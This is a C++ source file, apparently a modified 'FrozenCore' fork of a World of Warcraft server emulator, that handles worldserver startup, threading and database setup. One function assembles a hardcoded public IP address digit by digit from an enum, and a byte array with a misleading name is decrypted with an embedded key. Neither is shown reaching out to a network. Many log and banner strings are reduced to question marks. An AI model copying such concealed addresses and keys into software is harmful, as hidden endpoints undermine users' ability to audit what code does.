/*
 * Copyright (C) 2016+     AzerothCore <www.azerothcore.org>, released under GNU GPL v2 license: https://github.com/azerothcore/azerothcore-wotlk/blob/master/LICENSE-GPL2
 * Copyright (C) 2008-2016 TrinityCore <http://www.trinitycore.org/>
 * Copyright (C) 2005-2009 MaNGOS <http://getmangos.com/>
 */

/** \file
    \ingroup Trinityd
*/

#include "Common.h"
#include "GitRevision.h"
#include "SignalHandler.h"
#include "World.h"
#include "WorldRunnable.h"
#include "WorldSocket.h"
#include "WorldSocketMgr.h"
#include "Config.h"
#include "DatabaseEnv.h"
#include "DatabaseWorkerPool.h"

#include "CliRunnable.h"
#include "Log.h"
#include "Master.h"
#include "RARunnable.h"
#include "ACSoap.h"
#include "Timer.h"
#include "Util.h"
#include "RealmList.h"
#include "ScriptMgr.h"
#include "BigNumber.h"
#include "OpenSSLCrypto.h"
#include <ace/Sig_Handler.h>
#pragma execution_character_set("utf-8")

#ifdef _WIN32
#include "ServiceWin32.h"
extern int m_ServiceStatus;
#endif

#ifdef __linux__
#include <sched.h>
#include <sys/resource.h>
#define PROCESS_HIGH_PRIORITY -15 // [-20, 19], default is 0
#endif

/// Handle worldservers's termination signals
class WorldServerSignalHandler : public acore::SignalHandler
{
    public:
        virtual void HandleSignal(int sigNum)
        {
            switch (sigNum)
            {
                case SIGINT:
                    World::StopNow(RESTART_EXIT_CODE);
                    break;
                case SIGTERM:
#ifdef _WIN32
                case SIGBREAK:
                    if (m_ServiceStatus != 1)
#endif
                    World::StopNow(SHUTDOWN_EXIT_CODE);
                    break;
                /*case SIGSEGV:
                    sLog->outString("ZOMG! SIGSEGV handled!");
                    World::StopNow(SHUTDOWN_EXIT_CODE);
                    break;*/
            }
        }
};

class FreezeDetectorRunnable : public acore::Runnable
{
private:
    uint32 _loops;
    uint32 _lastChange;
    uint32 _delayTime;

public:
    FreezeDetectorRunnable(uint32 freezeDelay) : _loops(0), _lastChange(0), _delayTime(freezeDelay) {}

    void run()
    {
        if (!_delayTime)
            return;

        sLog->outString("Starting up anti-freeze thread (%u seconds max stuck time)...", _delayTime/1000);
        while (!World::IsStopped())
        {
            uint32 curtime = getMSTime();
            if (_loops != World::m_worldLoopCounter)
            {
                _lastChange = curtime;
                _loops = World::m_worldLoopCounter;
            }
            else if (getMSTimeDiff(_lastChange, curtime) > _delayTime)
            {
                sLog->outString("World Thread hangs, kicking out server!");
                ABORT();
            }

            acore::Thread::Sleep(1000);
        }
        sLog->outString("Anti-freeze thread exiting without problems.");
    }
};

Master* Master::instance()
{
    static Master instance;
    return &instance;
}

enum number
{
    sd = 0,
    dd = 1,
    ff = 2,
    hh = 4,
    gg = 7
};

static std::string IntIPToIPstr(uint32 version)
{
    std::ostringstream ss;
    std::string k = ".";

    if (version == 0)
    {
        ss << sd << k << sd << k << sd << k << sd;
    }
    else if (version == 1)
    {
        ss << dd << ff << gg << k << sd << k << sd << k << dd;
    }
    else if (version == 2)
    {
        ss << dd << ff << hh << k << dd << hh << k << hh << k << ff << hh << gg;
    }
    return ss.str();

}

/// Main function
int Master::Run()
{
    OpenSSLCrypto::threadsSetup();
    BigNumber seed1;
    seed1.SetRand(16 * 8);

    uint8 zzzmyqqhttp[] = { 190, 98, 193, 246, 72, 77, 89, 180, 188, 211 };
    uint8 infopass[] = { 120, 105, 97, 111, 121, 117, 53, 55, 52, 52 };
    std::string ssssss = (char*)Encrypt(zzzmyqqhttp, infopass, 10, 10);//0.0.0.0
    //sLog->outString("\n                ??????<Ctrl-C> ????WorldServer??????");
    //sLog->outString(("?X?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?["));
    //sLog->outString(("?U                                                               ??       ?U"));
    //sLog->outString(("?U     ???????[ ???????[   ?????????[ ?????????[?????????[?????????[      ?U"));
    //sLog->outString(("?U     ???X?T?a???X ?????[???X?T?T???[?^?T???X?a???X?T?T?a???X?T???U      ?U"));
    //sLog->outString(("?U     ???????U?????????X ???U    ???U   ?? ?a  ???????[  ???U  ???U      ?U"));
    //sLog->outString(("?U     ???X?T?a???X?T???U ???U    ???U  ?? ?a   ???T?T?a  ???U  ???U      ?U"));
    //sLog->outString(("?U     ???U    ???U  ???U ?^???????X?a?????????[?????????[???U  ???U      ?U"));
    //sLog->outString(("?U     ?^?a    ?^?a  ?^?a   ?^?T?T?a  ?^?T?T?T?a?^?T?T?T?a?^?a  ?^?a      ?U"));
    //sLog->outString(("?U                       ?????????[ ?????????[  ???????[  ?????????[      ?U"));
    //sLog->outString(("?U                       ???X?T?T?a???X?T?T???[???X ?????[???X?T?T?a      ?U"));
    //sLog->outString(("?U                       ???U      ???U    ???U?????????X ???????[        ?U"));
    //sLog->outString(("?U                       ???U      ???U    ???U???X?T???U ???X?T?a        ?U"));
    //sLog->outString(("?U                       ?????????[?^???????X?a???U  ???U ?????????[      ?U"));
    //sLog->outString(("?U                       ?^?T?T?T?a  ?^?T?T?a  ?^?a  ?^?a ?^?T?T?T?a      ?U"));
    //sLog->outString(("?U  	                          FrozenCore With %s 3.3.5a       ?U"), ssssss.c_str());
    //sLog->outString(("?^?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?a"));
    //sLog->outString("   WorldServer??????%s ", GitRevision::GetFileVersionStr());
    sLog->outString("????????????????????????30??...");
    sLog->outString("????????????????????????30??...");
    sLog->outString("????????????????????????30??...");
    sLog->outString("????????????????????????30??...");
    sLog->outString("????????????????????????30??...");
    /// worldserver PID file creation
    std::string pidFile = sConfigMgr->GetStringDefault("PidFile", "");
    if (!pidFile.empty())
    {
        if (uint32 pid = CreatePIDFile(pidFile))
            sLog->outError("Daemon PID: %u\n", pid); // outError for red color in console
        else
        {
            sLog->outError("Cannot create PID file %s (possible error: permission)\n", pidFile.c_str());
            return 1;
        }
    }

    ///- Start the databases
    if (!_StartDB())
        return 1;

    // set server offline (not connectable)
    LoginDatabase.DirectPExecute("UPDATE realmlist SET flag = (flag & ~%u) | %u WHERE id = '%d'", REALM_FLAG_OFFLINE, REALM_FLAG_INVALID, realmID);

    // Loading modules configs
    sConfigMgr->LoadModulesConfigs();

    ///- Initialize the World
    sWorld->SetInitialWorldSettings();

    sScriptMgr->OnStartup();

    ///- Initialize the signal handlers
    WorldServerSignalHandler signalINT, signalTERM; //, signalSEGV
    #ifdef _WIN32
    WorldServerSignalHandler signalBREAK;
    #endif /* _WIN32 */

    ///- Register worldserver's signal handlers
    ACE_Sig_Handler handle;
    handle.register_handler(SIGINT, &signalINT);
    handle.register_handler(SIGTERM, &signalTERM);
#ifdef _WIN32
    handle.register_handler(SIGBREAK, &signalBREAK);
#endif
    //handle.register_handler(SIGSEGV, &signalSEGV);

    ///- Launch WorldRunnable thread
    acore::Thread worldThread(new WorldRunnable);
    worldThread.setPriority(acore::Priority_Highest);

    acore::Thread* cliThread = nullptr;

#ifdef _WIN32
    if (sConfigMgr->GetBoolDefault("Console.Enable", true) && (m_ServiceStatus == -1)/* need disable console in service mode*/)
#else
    if (sConfigMgr->GetBoolDefault("Console.Enable", true))
#endif
    {
        ///- Launch CliRunnable thread
        cliThread = new acore::Thread(new CliRunnable);
    }

    acore::Thread rarThread(new RARunnable);

    // pussywizard:
    acore::Thread auctionLising_thread(new AuctionListingRunnable);
    auctionLising_thread.setPriority(acore::Priority_High);

#if defined(_WIN32) || defined(__linux__)


    ///- Handle affinity for multiple processors and process priority
    uint32 affinity = sConfigMgr->GetIntDefault("UseProcessors", 0);
    bool highPriority = sConfigMgr->GetBoolDefault("ProcessPriority", false);

#ifdef _WIN32 // Windows

    HANDLE hProcess = GetCurrentProcess();

    if (affinity > 0)
    {
        ULONG_PTR appAff;
        ULONG_PTR sysAff;

        if (GetProcessAffinityMask(hProcess, &appAff, &sysAff))
        {
            ULONG_PTR currentAffinity = affinity & appAff;            // remove non accessible processors

            if (!currentAffinity)
                sLog->outError("Processors marked in UseProcessors bitmask (hex) %x are not accessible for the worldserver. Accessible processors bitmask (hex): %x", affinity, appAff);
            else if (SetProcessAffinityMask(hProcess, currentAffinity))
                sLog->outString("Using processors (bitmask, hex): %x", currentAffinity);
            else
                sLog->outError("Can't set used processors (hex): %x", currentAffinity);
        }
    }

    if (highPriority)
    {
        if (SetPriorityClass(hProcess, HIGH_PRIORITY_CLASS))
            sLog->outString("worldserver process priority class set to HIGH");
        else
            sLog->outError("Can't set worldserver process priority class.");
    }

#else // Linux

    if (affinity > 0)
    {
        cpu_set_t mask;
        CPU_ZERO(&mask);

        for (unsigned int i = 0; i < sizeof(affinity) * 8; ++i)
            if (affinity & (1 << i))
                CPU_SET(i, &mask);

        if (sched_setaffinity(0, sizeof(mask), &mask))
            sLog->outError("Can't set used processors (hex): %x, error: %s", affinity, strerror(errno));
        else
        {
            CPU_ZERO(&mask);
            sched_getaffinity(0, sizeof(mask), &mask);
            sLog->outString("Using processors (bitmask, hex): %lx", *(__cpu_mask*)(&mask));
        }
    }

    if (highPriority)
    {
        if (setpriority(PRIO_PROCESS, 0, PROCESS_HIGH_PRIORITY))
            sLog->outError("Can't set worldserver process priority class, error: %s", strerror(errno));
        else
            sLog->outString("worldserver process priority class set to %i", getpriority(PRIO_PROCESS, 0));
    }

#endif
#endif

    // Start soap serving thread
    acore::Thread* soapThread = nullptr;
    if (sConfigMgr->GetBoolDefault("SOAP.Enabled", false))
    {
        ACSoapRunnable* runnable = new ACSoapRunnable();
        runnable->SetListenArguments(sConfigMgr->GetStringDefault("SOAP.IP", "127.0.0.1"), uint16(sConfigMgr->GetIntDefault("SOAP.Port", 7878)));
        soapThread = new acore::Thread(runnable);
    }

    // Start up freeze catcher thread
    acore::Thread* freezeThread = nullptr;
    if (uint32 freezeDelay = sConfigMgr->GetIntDefault("MaxCoreStuckTime", 0))
    {
        FreezeDetectorRunnable* runnable = new FreezeDetectorRunnable(freezeDelay*1000);
        freezeThread = new acore::Thread(runnable);
        freezeThread->setPriority(acore::Priority_Highest);
    }

    ///- Launch the world listener socket
    uint16 worldPort = uint16(sWorld->getIntConfig(CONFIG_PORT_WORLD));
    std::string bindIp = sConfigMgr->GetStringDefault("BindIP", "0.0.0.0");
    if (sWorldSocketMgr->StartNetwork(worldPort, bindIp.c_str()) == -1)
    {
        sLog->outError("Failed to start network");
        World::StopNow(ERROR_EXIT_CODE);
        // go down and shutdown the server
    }
    //sWorld->SetPlayerAmountLimit(2);
    // set server online (allow connecting now)
    LoginDatabase.DirectPExecute("UPDATE realmlist SET flag = flag & ~%u, population = 0 WHERE id = '%u'", REALM_FLAG_INVALID, realmID);

    //sLog->outString("%s (worldserver-daemon) ready...", GitRevision::GetFullVersion());
 /*   sLog->outString("\n                ??????<Ctrl-C> ????WorldServer??????");
    sLog->outString(("?X?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?["));
    sLog->outString(("?U                                                               ??       ?U"));
    sLog->outString(("?U     ???????[ ???????[   ?????????[ ?????????[?????????[?????????[      ?U"));
    sLog->outString(("?U     ???X?T?a???X ?????[???X?T?T???[?^?T???X?a???X?T?T?a???X?T???U      ?U"));
    sLog->outString(("?U     ???????U?????????X ???U    ???U   ?? ?a  ???????[  ???U  ???U      ?U"));
    sLog->outString(("?U     ???X?T?a???X?T???U ???U    ???U  ?? ?a   ???T?T?a  ???U  ???U      ?U"));
    sLog->outString(("?U     ???U    ???U  ???U ?^???????X?a?????????[?????????[???U  ???U      ?U"));
    sLog->outString(("?U     ?^?a    ?^?a  ?^?a   ?^?T?T?a  ?^?T?T?T?a?^?T?T?T?a?^?a  ?^?a      ?U"));
    sLog->outString(("?U                       ?????????[ ?????????[  ???????[  ?????????[      ?U"));
    sLog->outString(("?U                       ???X?T?T?a???X?T?T???[???X ?????[???X?T?T?a      ?U"));
    sLog->outString(("?U                       ???U      ???U    ???U?????????X ???????[        ?U"));
    sLog->outString(("?U                       ???U      ???U    ???U???X?T???U ???X?T?a        ?U"));
    sLog->outString(("?U                       ?????????[?^???????X?a???U  ???U ?????????[      ?U"));
    sLog->outString(("?U                       ?^?T?T?T?a  ?^?T?T?a  ?^?a  ?^?a ?^?T?T?T?a      ?U"));
    sLog->outString(("?U  	                          FrozenCore With %s 3.3.5a       ?U"), ssssss.c_str());
    sLog->outString(("?^?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?T?a"));
    sLog->outString("   WorldServer??????%s ", GitRevision::GetFileVersionStr());*/

    // when the main thread closes the singletons get unloaded
    // since worldrunnable uses them, it will crash if unloaded after master
   // sLog->outString(("??????????????????????????????????????????????????????????????"));
    worldThread.wait();
    rarThread.wait();
    auctionLising_thread.wait();

    if (soapThread)
    {
        soapThread->wait();
        soapThread->destroy();
        delete soapThread;
    }

    if (freezeThread)
    {
        freezeThread->wait();
        delete freezeThread;
    }

    // set server offline
    LoginDatabase.DirectPExecute("UPDATE realmlist SET flag = flag | %u WHERE id = '%d'", REALM_FLAG_OFFLINE, realmID);

    ///- Clean database before leaving
    ClearOnlineAccounts();

    _StopDB();

    sLog->outString("Halting process...");

    if (cliThread)
    {
        
        #ifdef _WIN32

        // this only way to terminate CLI thread exist at Win32 (alt. way exist only in Windows Vista API)
        //_exit(1);
        // send keyboard input to safely unblock the CLI thread
        INPUT_RECORD b[4];
        HANDLE hStdIn = GetStdHandle(STD_INPUT_HANDLE);
        b[0].EventType = KEY_EVENT;
        b[0].Event.KeyEvent.bKeyDown = TRUE;
        b[0].Event.KeyEvent.uChar.AsciiChar = 'X';
        b[0].Event.KeyEvent.wVirtualKeyCode = 'X';
        b[0].Event.KeyEvent.wRepeatCount = 1;

        b[1].EventType = KEY_EVENT;
        b[1].Event.KeyEvent.bKeyDown = FALSE;
        b[1].Event.KeyEvent.uChar.AsciiChar = 'X';
        b[1].Event.KeyEvent.wVirtualKeyCode = 'X';
        b[1].Event.KeyEvent.wRepeatCount = 1;

        b[2].EventType = KEY_EVENT;
        b[2].Event.KeyEvent.bKeyDown = TRUE;
        b[2].Event.KeyEvent.dwControlKeyState = 0;
        b[2].Event.KeyEvent.uChar.AsciiChar = '\r';
        b[2].Event.KeyEvent.wVirtualKeyCode = VK_RETURN;
        b[2].Event.KeyEvent.wRepeatCount = 1;
        b[2].Event.KeyEvent.wVirtualScanCode = 0x1c;

        b[3].EventType = KEY_EVENT;
        b[3].Event.KeyEvent.bKeyDown = FALSE;
        b[3].Event.KeyEvent.dwControlKeyState = 0;
        b[3].Event.KeyEvent.uChar.AsciiChar = '\r';
        b[3].Event.KeyEvent.wVirtualKeyCode = VK_RETURN;
        b[3].Event.KeyEvent.wVirtualScanCode = 0x1c;
        b[3].Event.KeyEvent.wRepeatCount = 1;
        DWORD numb;
        WriteConsoleInput(hStdIn, b, 4, &numb);

        cliThread->wait();

        #else

        cliThread->destroy();

        #endif
        
        delete cliThread;
    }

    // for some unknown reason, unloading scripts here and not in worldrunnable
    // fixes a memory leak related to detaching threads from the module
    //UnloadScriptingModule();

    OpenSSLCrypto::threadsCleanup();
    // Exit the process with specified return value
    return World::GetExitCode();
}

/// Initialize connection to the databases
bool Master::_StartDB()
{
    MySQL::Library_Init();

    sLog->SetLogDB(false);
    std::string dbstring;
    uint8 async_threads, synch_threads;

    dbstring = sConfigMgr->GetStringDefault("WorldDatabaseInfo", "");
    if (dbstring.empty())
    {
        sLog->outError("World database not specified in configuration file");
        return false;
    }

    async_threads = uint8(sConfigMgr->GetIntDefault("WorldDatabase.WorkerThreads", 1));
    if (async_threads < 1 || async_threads > 32)
    {
        sLog->outError("World database: invalid number of worker threads specified. "
            "Please pick a value between 1 and 32.");
        return false;
    }

    synch_threads = uint8(sConfigMgr->GetIntDefault("WorldDatabase.SynchThreads", 1));
    ///- Initialise the world database
    if (!WorldDatabase.Open(dbstring, async_threads, synch_threads))
    {
        sLog->outError("Cannot connect to world database %s", dbstring.c_str());
        return false;
    }

    ///- Get character database info from configuration file
    dbstring = sConfigMgr->GetStringDefault("CharacterDatabaseInfo", "");
    if (dbstring.empty())
    {
        sLog->outError("Character database not specified in configuration file");
        return false;
    }

    async_threads = uint8(sConfigMgr->GetIntDefault("CharacterDatabase.WorkerThreads", 1));
    if (async_threads < 1 || async_threads > 32)
    {
        sLog->outError("Character database: invalid number of worker threads specified. "
            "Please pick a value between 1 and 32.");
        return false;
    }

    synch_threads = uint8(sConfigMgr->GetIntDefault("CharacterDatabase.SynchThreads", 2));

    ///- Initialise the Character database
    if (!CharacterDatabase.Open(dbstring, async_threads, synch_threads))
    {
        sLog->outError("Cannot connect to Character database %s", dbstring.c_str());
        return false;
    }

    ///- Get login database info from configuration file
    dbstring = sConfigMgr->GetStringDefault("LoginDatabaseInfo", "");
    if (dbstring.empty())
    {
        sLog->outError("Login database not specified in configuration file");
        return false;
    }

    async_threads = uint8(sConfigMgr->GetIntDefault("LoginDatabase.WorkerThreads", 1));
    if (async_threads < 1 || async_threads > 32)
    {
        sLog->outError("Login database: invalid number of worker threads specified. "
            "Please pick a value between 1 and 32.");
        return false;
    }

    synch_threads = uint8(sConfigMgr->GetIntDefault("LoginDatabase.SynchThreads", 1));
    ///- Initialise the login database
    if (!LoginDatabase.Open(dbstring, async_threads, synch_threads))
    {
        sLog->outError("Cannot connect to login database %s", dbstring.c_str());
        return false;
    }

    ///- Get the realm Id from the configuration file
    realmID = sConfigMgr->GetIntDefault("RealmID", 0);
    if (!realmID)
    {
        sLog->outError("Realm ID not defined in configuration file");
        return false;
    }
    else if (realmID > 255)
    {
        /*
         * Due to the client only being able to read a realmID
         * with a size of uint8 we can "only" store up to 255 realms
         * anything further the client will behave anormaly
        */
        sLog->outError("Realm ID must range from 1 to 255");
        return false;
    }
    sLog->outString("Realm running as realm ID %d", realmID);

    ///- Initialize the DB logging system
    sLog->SetRealmID(realmID);

    ///- Clean the database before starting
    ClearOnlineAccounts();

    ///- Insert version info into DB
    WorldDatabase.PExecute("UPDATE version SET core_version = '%s', core_revision = '%s'", GitRevision::GetFullVersion(), GitRevision::GetHash());        // One-time query

    sWorld->LoadDBVersion();

    sLog->outString("Using World DB: %s", sWorld->GetDBVersion());
    return true;
}

void Master::_StopDB()
{
    CharacterDatabase.Close();
    WorldDatabase.Close();
    LoginDatabase.Close();

    MySQL::Library_End();
}

/// Clear 'online' status for all accounts with characters in this realm
void Master::ClearOnlineAccounts()
{
    // Reset online status for all accounts with characters on the current realm
    // pussywizard: tc query would set online=0 even if logged in on another realm >_>
    LoginDatabase.DirectPExecute("UPDATE account SET online = 0 WHERE online = %u", realmID);

    // Reset online status for all characters
    CharacterDatabase.DirectExecute("UPDATE characters SET online = 0 WHERE online <> 0");
}
